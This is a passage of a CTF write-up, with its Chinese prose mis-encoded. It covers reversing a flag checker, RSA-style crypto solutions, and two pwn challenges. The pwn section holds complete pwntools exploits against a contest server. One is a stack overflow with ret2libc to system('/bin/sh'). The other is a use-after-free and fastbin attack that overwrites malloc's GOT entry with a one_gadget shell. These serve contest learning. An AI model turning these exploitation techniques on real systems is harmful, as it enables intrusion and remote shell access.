ä»¥åé‡æ–°åæ±‡ç¼–ï¼Œè¿˜æ˜¯æ²¡æœ‰å•¥ä¸œè¥¿...ä¸ºäº†ä¸å½±å“åé¢åšé¢˜ï¼Œè¿˜æ˜¯å›åˆ°ä¸€å¼€å§‹çš„åœ°æ–¹æŠŠ
jz æ”¹æˆäº† jnz
ï¼Œç„¶ååŠ¨è°ƒå‘ç°è¿™ä¸ªå¸¦èŠ±çš„å‡½æ•°åŸºæœ¬æ²¡å•¥ç”¨ï¼Œå¥½åƒå°±è°ƒç”¨äº†ä¸ª<code>__chkesp</code>å‡½æ•°ï¼Œä½†æˆ‘ä¸å¤ªæ¸…æ¥šè¿™æ˜¯å¹²å•¥çš„ï¼Œå°±ç›´æ¥å¿½ç•¥äº†</p>
<h4 id="nd-important-function">- 2nd important function</h4>
<p>ç¬¬äºŒä¸ªé‡è¦å‡½æ•°å¯¹æˆ‘ä»¬è¾“å…¥çš„ flag
åšäº†ä¸€äº›æ“ä½œï¼ŒæŠŠä¸­é—´çš„'-'å…¨éƒ¨åˆ æ‰ï¼Œå¹¶åšäº†ä¸€äº›ç§»åŠ¨çš„æ“ä½œï¼Œå¤§æ¦‚å°±æ˜¯
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa&#125;</span><br><span class="line">flag&#123;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#125;</span><br></pre></td></tr></table></figure></p>
<h4 id="rd-important-function">- 3rd important function</h4>
<p>ç¬¬ä¸‰ä¸ªå‡½æ•°å°† uuid çš„å‰ 32
ä¸ªå­—èŠ‚ä½œä¸ºå‚æ•°ï¼Œåšäº†ä¸€äº›å¼‚æˆ–æ“ä½œå’Œæ¯”å¯¹æ“ä½œï¼Œæˆ‘ä»¬å¯ä»¥æ¢å¤ä¸€éƒ¨åˆ† flag
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> encdata1[<span class="number">13</span>];</span><br><span class="line"><span class="type">char</span> encdata2[<span class="number">16</span>];</span><br><span class="line"><span class="type">int</span> encdata3[<span class="number">22</span>];</span><br><span class="line"><span class="type">char</span> flag[<span class="number">42</span>]=<span class="string">&quot;flag&#123;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaxxxx&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    encdata1[<span class="number">0</span>] = <span class="number">102</span>;</span><br><span class="line">    encdata1[<span class="number">1</span>] = <span class="number">52</span>;</span><br><span class="line">    encdata1[<span class="number">2</span>] = <span class="number">51</span>;</span><br><span class="line">    encdata1[<span class="number">3</span>] = <span class="number">49</span>;</span><br><span class="line">    encdata1[<span class="number">4</span>] = <span class="number">52</span>;</span><br><span class="line">    encdata1[<span class="number">5</span>] = <span class="number">57</span>;</span><br><span class="line">    encdata1[<span class="number">6</span>] = <span class="number">96</span>;</span><br><span class="line">    encdata1[<span class="number">7</span>] = <span class="number">60</span>;</span><br><span class="line">    encdata1[<span class="number">8</span>] = <span class="number">61</span>;</span><br><span class="line">    encdata1[<span class="number">9</span>] = <span class="number">34</span>;</span><br><span class="line">    encdata1[<span class="number">10</span>] = <span class="number">104</span>;</span><br><span class="line">    encdata1[<span class="number">11</span>] = <span class="number">33</span>;</span><br><span class="line">    encdata1[<span class="number">12</span>] = <span class="number">56</span>;</span><br><span class="line">    <span class="type">int</span> count = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">13</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( i % <span class="number">2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            flag[count] = encdata1[i] ^ (<span class="number">2</span>*i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            flag[count] = encdata1[i] ^ i;</span><br><span class="line">        &#125;</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">func1</span>();</span><br><span class="line">    cout&lt;&lt;flag&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta"># flag&#123;f61703f2-50b7-4aaa-aaaa-aaaaaaaaaaaa&#125;</span></span><br></pre></td></tr></table></figure></p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œè¿™ä¸ªå‡½æ•°åªå¯¹å‰13ä¸ªå­—èŠ‚åšäº†æ“ä½œï¼Œå‰©ä¸‹çš„19ä¸ªå­—èŠ‚æ²¡ç”¨åˆ°</p>
<h4 id="th-important-function">- 4th important function</h4>
<p>ç¬¬å››ä¸ªå‡½æ•°å°† uuid
çš„ä¸­é—´18ä½æ”¾äº†è¿›å»ï¼Œç„¶ååšäº†ä¸€å¤§å †æ“ä½œä»¥åè·Ÿä¸‹é¢çš„ä¸œè¥¿åšäº†æ¯”è¾ƒ</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">v5[<span class="number">0</span>] = <span class="number">63</span>;</span><br><span class="line">v5[<span class="number">1</span>] = <span class="number">-70</span>;</span><br><span class="line">v5[<span class="number">2</span>] = <span class="number">-60</span>;</span><br><span class="line">v5[<span class="number">3</span>] = <span class="number">-111</span>;</span><br><span class="line">v5[<span class="number">4</span>] = <span class="number">-60</span>;</span><br><span class="line">v5[<span class="number">5</span>] = <span class="number">116</span>;</span><br><span class="line">v5[<span class="number">6</span>] = <span class="number">2</span>;</span><br><span class="line">v5[<span class="number">7</span>] = <span class="number">38</span>;</span><br><span class="line">v5[<span class="number">8</span>] = <span class="number">-20</span>;</span><br><span class="line">v5[<span class="number">9</span>] = <span class="number">-110</span>;</span><br><span class="line">v5[<span class="number">10</span>] = <span class="number">56</span>;</span><br><span class="line">v5[<span class="number">11</span>] = <span class="number">-62</span>;</span><br><span class="line">v5[<span class="number">12</span>] = <span class="number">11</span>;</span><br><span class="line">v5[<span class="number">13</span>] = <span class="number">109</span>;</span><br><span class="line">v5[<span class="number">14</span>] = <span class="number">39</span>;</span><br><span class="line">v5[<span class="number">15</span>] = <span class="number">-45</span>;</span><br></pre></td></tr></table></figure>
<p>ç”±äºçœ‹åˆ°äº†è¿™ä¸ªå‡½æ•°é‡Œé¢æœ‰ä¸ªå­å‡½æ•°æœ‰è¶…é•¿çš„ä¸€ä¸²ï¼Œè™½ç„¶çœ‹ä¸æ‡‚ï¼Œä½†æˆ‘æ€€ç–‘è¿™åº”è¯¥æ˜¯æŸä¸ªåŠ å¯†ç®—æ³•çš„æ‰‹æ“ç‰ˆï¼Œäºæ˜¯å°±é—®
GPT è€å¸ˆï¼Œå®ƒè·Ÿæˆ‘è¯´æ˜¯MD5åŠ å¯†ç®—æ³•çš„ä¸€éƒ¨åˆ†(åæ¥ç”¨ findcrypt
æ’ä»¶ä¹Ÿèƒ½çœ‹å‡ºæ¥)ã€‚</p>
<p>è€Œåé¢è¿˜æœ‰ä¸ªå‡½æ•°æ˜¯è¿™18ä½ä¸­å‰14ä½çš„ base64_encode
ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬è§£ç ååªéœ€è¦çˆ†ç ´å4ä½å³å¯</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_md5</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(text.encode(<span class="string">&#x27;utf-8&#x27;</span>)).digest()</span><br><span class="line"></span><br><span class="line">target_hash = ([<span class="number">63</span>, -<span class="number">70</span>, -<span class="number">60</span>, -<span class="number">111</span>, -<span class="number">60</span>, <span class="number">116</span>, <span class="number">2</span>, <span class="number">38</span>, -<span class="number">20</span>, -<span class="number">110</span>, <span class="number">56</span>, -<span class="number">62</span>, <span class="number">11</span>, <span class="number">109</span>, <span class="number">39</span>, -<span class="number">45</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        <span class="comment"># å°†iå’Œjè½¬æ¢ä¸ºä¸¤ä½16è¿›åˆ¶æ•°</span></span><br><span class="line">                hex_i = <span class="built_in">format</span>(i, <span class="string">&#x27;01x&#x27;</span>)</span><br><span class="line">                hex_j = <span class="built_in">format</span>(j, <span class="string">&#x27;01x&#x27;</span>)</span><br><span class="line">                hex_k = <span class="built_in">format</span>(k, <span class="string">&#x27;01x&#x27;</span>)</span><br><span class="line">                hex_m = <span class="built_in">format</span>(m, <span class="string">&#x27;01x&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># æ„å»ºå¾…åŠ å¯†çš„æ˜æ–‡</span></span><br><span class="line">                plaintext = <span class="string">f&#x27;f47813c26594c0<span class="subst">&#123;hex_i&#125;</span><span class="subst">&#123;hex_j&#125;</span><span class="subst">&#123;hex_k&#125;</span><span class="subst">&#123;hex_m&#125;</span>&#x27;</span></span><br><span class="line">                <span class="comment"># print(plaintext)</span></span><br><span class="line">                </span><br><span class="line">                <span class="comment"># è®¡ç®—MD5æ•£åˆ—å€¼</span></span><br><span class="line">                hashed_text = generate_md5(plaintext)</span><br><span class="line">                <span class="comment"># print(hashed_text.hex())</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> hashed_text.<span class="built_in">hex</span>() == <span class="string">&#x27;3fbac491c4740226ec9238c20b6d27d3&#x27;</span>:</span><br><span class="line">                    <span class="built_in">print</span>(plaintext)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;f61703f2-50b7-4f47-813c-26594c0e581a&#125; // è¿™é‡Œçš„æœ€åä¸€ä½ a ä¸æ˜¯çœŸçš„ a ï¼Œæ˜¯å› ä¸ºä¸€å¼€å§‹æˆ‘å†™çš„ flag æ ¼å¼æ˜¯aï¼Œè¿™ä¸€ä½è¿˜æ˜¯éœ€è¦æˆ‘ä»¬çˆ†ç ´çš„</span></span><br></pre></td></tr></table></figure>
<p>æ‹¿åˆ°å¹³å°ä¸Šå»çˆ†ç ´æœ€åä¸€ä½ï¼Œæ²¡æƒ³åˆ°ç›´æ¥å°±æ˜¯ 0 ï¼Œä¸€éè¿‡~</p>
<blockquote>
<p>flag{f61703f2-50b7-4f47-813c-26594c0e5810}</p>
</blockquote>
<h1 id="pwn">PWN</h1>
<h2 id="inverse">inverse</h2>
<p>32ä½ + æ•´æ•°æº¢å‡º + ç®€å•æ ˆæº¢å‡ºï¼Œæ€è·¯çœŸæ²¡å•¥å¥½å†™çš„ï¼Œç›´æ¥ä¸Šexpå§</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">ip = <span class="string">&#x27;124.71.135.126:30011&#x27;</span>.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">file = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">io = remote(ip[<span class="number">0</span>],<span class="built_in">int</span>(ip[<span class="number">1</span>]))</span><br><span class="line"><span class="comment"># io = process(file)</span></span><br><span class="line"><span class="comment"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line">io.send(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">work_addr = <span class="number">0x80493D5</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span> + p32(puts_plt) + p32(work_addr) + p32(read_got)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27; msg:&#x27;</span>)</span><br><span class="line">read_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;read_addr  ---&gt;  &#x27;</span>,<span class="built_in">hex</span>(read_addr))</span><br><span class="line"></span><br><span class="line">libc_base = read_addr - libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh  =  libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">bin_sh = <span class="number">0x0804C030</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base  ---&gt;  &#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys_addr  ---&gt;  &#x27;</span>,<span class="built_in">hex</span>(sys_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;bin_sh  ---&gt;  &#x27;</span>,<span class="built_in">hex</span>(bin_sh))</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span> + p32(sys_addr) + p32(work_addr) + p32(bin_sh)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="controller">controller</h2>
<p>è¿™é¢˜æ˜¯ awdp/awd çš„é¢˜å§ï¼Œå¥½å¤šæ´...ä½†æ˜¯ä¸ºä»€ä¹ˆ patchelf
ä»¥åä¼šç»™æˆ‘æŠ¥<code>libgcc_s.so.0</code>çš„é”™å•Šï¼Œæˆ‘è¿˜ä»
lib64/lib/2.27libgccåº“ ä¸­æ‹·è´äº†å¯¹åº”æ–‡ä»¶ï¼Œç»“æœéƒ½ä¸è¡Œ...</p>
<p>ç°ç›’çš„ heap é¢˜å¤ªéš¾æ‰“äº†...ä¸è¿‡ä»22:00æ‰“åˆ°3:00å‡º flag
çš„ä¸€ç¬é—´çœŸçš„å·¨çˆ½</p>
<p>è¿™é¢˜é€†å‘å°±æŒºè´¹æ—¶é—´çš„ï¼Œä¸€å †æ²¡å•¥ç”¨çš„å‡½æ•°ï¼Œå°±åªæœ‰<code>choice == 1/2/3/6(å †é¢˜çš„uaf) || choice == 1/9(fmt + æ ˆ)</code></p>
<p>...å†™ wp çš„æ—¶å€™å»çœ‹äº†ä¸€ä¸‹ choice == 9ï¼Œç»“æœçªç„¶å‘ç° strlen ç”¨''
å°±å¯ä»¥éšä¾¿ç»•...æ—©çŸ¥é“ä¸ç°ç›’æ‰“å †äº†...</p>
<p>æˆ‘çš„æ€è·¯æ˜¯ uaf + fastbin attack</p>
<ul>
<li>alloc å† free ä¸¤ä¸ª chunk<br />
</li>
<li>ç”±äº fastbin LIFOï¼Œåˆ©ç”¨ uaf å°† heap_list (å †æŒ‡é’ˆè¡¨)çš„åœ°å€å†™å…¥
chunk13 çš„ fd å’Œ bk</li>
<li>ç”³è¯·ä¸¤ä¸ªåŒæ ·å¤§å°çš„ chunk ï¼Œæˆ‘ä»¬å°±èƒ½ç”¨ chunk15 ä»»æ„åœ°å€è¯»å†™äº†</li>
<li>leak
<ul>
<li>é¦–å…ˆæŠŠ malloc çš„ got å†™è¿› chunk15ï¼Œç„¶å showï¼Œå°±å¯ä»¥leak libc
åŸºå€</li>
</ul></li>
<li>write
<ul>
<li>ç”±äºè¿™ä¸ªæ—¶å€™ï¼Œheap_list ä¸­è¿˜å­˜æœ‰ malloc_got
ï¼Œäºæ˜¯æˆ‘ä»¬ç›´æ¥æ§åˆ¶è¿™ä¸ªæŒ‡é’ˆå»å†™ malloc_got æŒ‡å‘çš„åœ°å€</li>
</ul></li>
<li>å°† one_gadget å†™å…¥ malloc_got æŒ‡å‘çš„åœ°å€ï¼Œå½“æˆ‘ä»¬å†å» malloc
çš„æ—¶å€™ï¼Œå°±ä¼šè°ƒç”¨ og è¿›è€Œææƒã€‚</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">ip = <span class="string">&#x27;124.71.135.126:30070&#x27;</span>.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">file = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">io = remote(ip[<span class="number">0</span>],<span class="built_in">int</span>(ip[<span class="number">1</span>]))</span><br><span class="line"><span class="comment"># io = process(file)</span></span><br><span class="line"><span class="comment"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size,content1,content2</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;length of the new pipe name? &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;name of the new pipe? &#x27;</span>, content1)</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Please write a description: &#x27;</span>, content2)</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;(radius,speed,length): &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Please choose pipe: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">  io.sendline()</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">6</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Choose &gt;&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Please choose pipe: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Plese input info &gt;&#x27;</span>,content)</span><br><span class="line">  io.sendline()</span><br><span class="line"></span><br><span class="line"><span class="comment"># def show(index):</span></span><br><span class="line"><span class="comment">#   io.sendlineafter(&#x27;&gt; &#x27;, str(1))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line">content1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">content2 = <span class="string">&#x27;b&#x27;</span>*<span class="number">80</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x30</span>,content1,content2) <span class="comment"># 12</span></span><br><span class="line">alloc(<span class="number">0x30</span>,content1,content2) <span class="comment"># 13</span></span><br><span class="line">free(<span class="number">12</span>)</span><br><span class="line">free(<span class="number">13</span>)</span><br><span class="line">content = p64(<span class="number">0x60418f</span>)</span><br><span class="line">edit(<span class="number">13</span>,content)</span><br><span class="line">alloc(<span class="number">0x30</span>,content1,content1) <span class="comment"># 14</span></span><br><span class="line"></span><br><span class="line">malloc_got = elf.got[<span class="string">&#x27;malloc&#x27;</span>]</span><br><span class="line">content1 = <span class="string">b&#x27;\x00\x00\x00\x01\x00\x00\x02\x40\x00&#x27;</span> + p64(malloc_got) + p64(malloc_got)</span><br><span class="line">alloc(<span class="number">0x30</span>,content1,content1) <span class="comment"># 15</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># io.sendlineafter(&#x27;&gt; &#x27;, str(11))</span></span><br><span class="line"><span class="comment"># io.sendlineafter(&#x27;&gt; &#x27;, str(1))</span></span><br><span class="line">malloc_addr = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_addr   ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(malloc_addr))</span><br><span class="line">libc_base = malloc_addr - libc.sym[<span class="string">&#x27;malloc&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base   ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">og = [<span class="number">0x4f2a5</span>,<span class="number">0x4f302</span>,<span class="number">0x10a2fc</span>]</span><br><span class="line">get_shell = libc_base + og[<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base   ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(get_shell))</span><br><span class="line">content = p64(get_shell)</span><br><span class="line">io.sendline()</span><br><span class="line">edit(<span class="number">2</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x4f2a5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f302 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a2fc execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>ä¸ºäº†å†™è¿™é¢˜æˆ‘è¿˜ç‰¹æ„å†™äº†ä¸ª exp_local.py æ¥æµ‹è¯•æœ¬åœ°é«˜ç‰ˆæœ¬libcçš„å †..</p>
</blockquote>
<h1 id="crypto">Crypto</h1>
<blockquote>
<p>æ²¡æƒ³åˆ° ak çš„å±…ç„¶æ˜¯å¯†ç ï¼Œè¿™ä¿©éƒ½æ˜¯æ¿å­é¢˜</p>
</blockquote>
<h2 id="ezrsa">ezRSA</h2>
<p>è¿™é¢˜ä¸¤ä¸ªæ•°çš„ä½ç½®åäº†ğŸ˜­å¡äº†å¥½é•¿æ—¶é—´æ¥ç€ï¼Œæˆ‘è¯´ä¸ºä»€ä¹ˆ getPrime ç”Ÿæˆçš„ p
æ€ä¹ˆä¼šä¸æ˜¯ç´ æ•°</p>
<p>è¿™é¢˜ä¸€çœ¼æ±‚è§£äºŒæ¬¡å‰©ä½™ï¼Œå…¬é’¥è¯¾ä¸Šå­¦è¿‡(æ²¡æƒ³åˆ°è¯¾å ‚ä¸Šçš„ä¸œè¥¿èƒ½æ‹¿æ¥æ‰“CTF)ï¼Œä»ç½‘ä¸Šæ‰’ä¸€ä¸ªè„šæœ¬ç›´æ¥è§£
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p=<span class="number">13107939563507459774616204141253747489232063336204173944123263284507604328885680072478669016969428366667381358004059204207134817952620014738665450753147857</span></span><br><span class="line">a=<span class="number">4124820799737107236308837008524397355107786950414769996181324333556950154206980059406402767327725312238673053581148641438494212320157665395208337575556385</span></span><br><span class="line"></span><br><span class="line">k=<span class="number">0</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">P=(p-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> p%<span class="number">4</span>==<span class="number">3</span>:</span><br><span class="line">    <span class="built_in">print</span>(gmpy2.powmod(a,<span class="built_in">int</span>((p+<span class="number">1</span>)//<span class="number">4</span>),p))</span><br><span class="line">    <span class="built_in">print</span>(-gmpy2.powmod(a,<span class="built_in">int</span>((p+<span class="number">1</span>)//<span class="number">4</span>),p))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">while</span> P%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">        P=P//<span class="number">2</span></span><br><span class="line">        k=k+<span class="number">1</span></span><br><span class="line">    q=<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> q: </span><br><span class="line">        l=gmpy2.powmod(q,<span class="built_in">int</span>((p-<span class="number">1</span>)//<span class="number">2</span>),p)</span><br><span class="line">        <span class="keyword">if</span> l==p-<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        q=sympy.nextprime(q)</span><br><span class="line">    b=gmpy2.powmod(q,P,p)</span><br><span class="line">    x=[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(k)]</span><br><span class="line">    re_a=gmpy2.invert(a,p)</span><br><span class="line">    x[k-<span class="number">1</span>]=gmpy2.powmod(a,<span class="built_in">int</span>((P+<span class="number">1</span>)//<span class="number">2</span>),p)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,k):</span><br><span class="line">        m=re_a*<span class="built_in">pow</span>(x[k-i],<span class="number">2</span>)</span><br><span class="line">        n=<span class="built_in">pow</span>(<span class="number">2</span>,(k-i-<span class="number">1</span>))</span><br><span class="line">        <span class="keyword">if</span> gmpy2.powmod(m,n,p)==p-<span class="number">1</span>:</span><br><span class="line">            j0=<span class="number">1</span></span><br><span class="line">            x[k-i-<span class="number">1</span>]=x[k-i]*<span class="built_in">pow</span>(b,j0*(<span class="number">2</span>**(i-<span class="number">1</span>)))%p</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            j1=<span class="number">0</span></span><br><span class="line">            x[k-i-<span class="number">1</span>]=x[k-i]%p</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(p-x[<span class="number">0</span>]))</span><br></pre></td></tr></table></figure></p>
<p><img src="https://i.imgs.ovh/2023/11/19/H0sMV.png" /> ## hdRSA</p>
<p>3:00-5:00å°±åœ¨æ‰¾è¿™é“é¢˜çš„å…³é”®è¯...</p>
<p>ä» "rsa ç‰¹æ®Šæ„é€ p" åˆ° "rsa D*V**2+1" å†åˆ° "rsa
4p+1"ï¼Œç»ˆäºè®©æˆ‘æ‰¾åˆ°æœ‰ç”¨çš„ä¸œè¥¿äº†ï¼Œä»<a
href="https://lazzzaro.github.io/2020/05/06/crypto-RSA/index.html">Lazzzaroçš„è¿™ç¯‡åšå®¢</a>é‡Œï¼Œæ‰¾åˆ°äº†<a
href="https://github.com/crocs-muni/cm_factorization/tree/master">è¿™ä¸ªå·¥å…·</a>,ç›´æ¥
tmux å››ä¸ªçª—å£æ¢­å“ˆéå† Dï¼</p>
